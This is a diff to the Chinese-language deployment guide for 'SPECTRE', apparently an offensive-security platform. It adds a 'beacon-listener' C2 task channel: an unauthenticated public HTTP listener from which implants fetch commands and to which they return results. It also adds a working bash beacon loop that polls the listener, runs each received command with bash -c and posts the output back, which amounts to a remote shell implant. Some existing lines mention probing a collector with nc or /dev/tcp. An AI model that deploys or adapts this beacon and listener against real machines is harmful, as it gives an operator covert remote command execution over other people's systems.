@@ -41,6 +41,7 @@ SPECTRE 的机器请用下方手工路径(可换端口/路径)。
 | gateway | `gateway/server.py` | 8081 | `GATEWAY_BIND_HOST` `GATEWAY_PORT` `RUNTIME_HOST` `RUNTIME_PORT` `GATEWAY_DIST_DIR` `SPECTRE_AUTH_DIR` `GATEWAY_LOG_DIR` `SPECTRE_DATA_DIR` `INTERNAL_TOKEN`(与 backend 同值, API 反代必需) `GATEWAY_INSECURE_COOKIE`(仅纯 HTTP 测试) `GATEWAY_TRUST_PROXY`(直连公网时置 0) |
 | worker | Temporal activities | — | 同 runtime |
 | oob-collector | `deploy/oob-collector.py` | 19999 | `OOB_PORT` `SPECTRE_DATA_DIR` |
+| beacon-listener | `deploy/beacon-listener.py` | 19997 | `BEACON_PORT` `SPECTRE_DATA_DIR` |
 | private-qa | `deploy/systemd/spectre-private-qa.service` | 8899 | — |
 
 ## 步骤
@@ -141,6 +142,31 @@ OOB_PORT=19999 SPECTRE_DATA_DIR=/var/lib/spectre python3 deploy/oob-collector.py
 
 两个变量显式带上——缺省数据根即生产路径, 未设 `SPECTRE_DATA_DIR` 时脚本硬拒 rc=1(fetch 家族同制式, R32D76 起), 测试时务必指向隔离目录。
 语义: 裸 TCP 字节收集器非 HTTP——curl 探测会挂起(属预期), 测试用 `nc 127.0.0.1 <port>` 或 `/dev/tcp`。
+
+## 手工运行 beacon-listener(C2 会话任务信道)
+
+```bash
+BEACON_PORT=19997 SPECTRE_DATA_DIR=/tmp/beacon-test python3 deploy/beacon-listener.py
+```
+
+与 OOB 收集器同形态: 公网 HTTP 监听、无认证(配额=工程防滥非访问控制)、
+`SPECTRE_DATA_DIR` 未设硬拒 rc=1。语义: **双向**任务信道——植入端(beacon)
+`GET /task/<sh-id>` 取任务、`POST /result/<sh-id>` 回传; 操作员侧经
+`shell` 工具 `register(transport:'beacon', transportRef:'http://<host>:19997')`
+注册通道后 `exec/read_file` 即走该会话(入队+轮询等回传, 上限 120s)。
+最小验证 beacon(bash):
+
+```bash
+SID=<register 回执的 shell id>
+while true; do
+  T=$(curl -s http://127.0.0.1:19997/task/$SID); [ -z "$T" ] && { sleep 2; continue; }
+  ID=$(printf %s "$T" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
+  CMD=$(printf %s "$T" | python3 -c 'import sys,json;print(json.load(sys.stdin)["cmd"])')
+  OUT=$(bash -c "$CMD" 2>&1); RC=$?
+  printf %s "$OUT" | python3 -c 'import sys,json;print(json.dumps({"id":sys.argv[1],"stdout":sys.stdin.read(),"code":int(sys.argv[2])}))' "$ID" "$RC" \
+    | curl -s -X POST -d @- http://127.0.0.1:19997/result/$SID >/dev/null
+done
+```
 
 ## API 契约
 
